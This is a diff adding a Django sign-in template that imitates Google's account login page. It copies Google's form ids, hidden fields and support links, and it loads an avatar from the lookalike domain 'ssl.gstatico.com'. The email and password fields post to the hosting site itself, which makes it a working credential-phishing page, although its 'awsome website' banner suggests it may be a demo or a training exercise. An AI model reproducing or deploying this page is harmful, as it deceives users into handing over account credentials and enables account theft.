@@ -1,0 +1,63 @@
+{% include "registration/fastCss.css" %}
+
+<div class="main content clearfix">
+  <div class="banner">
+    <h1>
+      This is an awsome website.
+    </h1>
+    <h2 class="hidden-small">
+      Sign into this awsome website
+    </h2>
+  </div>
+  <div class="card signin-card clearfix">
+    <div id="cc_iframe_parent"></div>
+    <img class="profile-img" src="https://ssl.gstatico.com/accounts/ui/avatar_2x.png" alt="">
+    <p class="profile-name"></p>
+    <form novalidate method="post" action="" id="gaia_loginform">{% csrf_token %}
+      <input name="next" type="hidden" value={{ next }}>
+      <input name="GALX" type="hidden"
+             value="-oQ55Eo3seQ">
+      <input name="continue" type="hidden" value="https://www.google.com/?authuser=0">
+      <input name="sacu" type="hidden" value="1">
+      <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
+      <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
+      <input type="hidden" id="pstMsg" name="pstMsg" value="0">
+      <input type="hidden" id="dnConn" name="dnConn" value="">
+      <input type="hidden" id="checkConnection" name="checkConnection" value="">
+      <input type="hidden" id="checkedDomains" name="checkedDomains"
+             value="youtube">
+      <label class="hidden-label" for="Email">Email</label>
+      <input id="username" name="username" type="email"
+             placeholder="username"
+             value=""
+             spellcheck="false"
+             class="">
+      <label class="hidden-label" for="Passwd">Password</label>
+      <input id="password" name="password" type="password"
+             placeholder="password"
+             class="">
+      <input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
+      <label class="remember">
+        <input id="PersistentCookie" name="PersistentCookie"
+               type="checkbox" value="yes"
+               checked="checked">
+        <span>
+          Stay signed in
+        </span>
+        <div class="bubble-wrap" role="tooltip">
+          <div class="bubble-pointer"></div>
+          <div class="bubble">
+            For your convenience, keep this checked. On shared devices, additional precautions are recommended.
+            <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
+          </div>
+        </div>
+      </label>
+      <input type="hidden" name="rmShown" value="1">
+      <a id="link-forgot-passwd" href="https://accounts.google.com/RecoverAccount?continue=https%3A%2F%2Fwww.google.com%2F%3Fauthuser%3D0"
+         class="need-help-reverse"
+         >
+        Need help?
+      </a>
+    </form>
+  </div>
+</div>
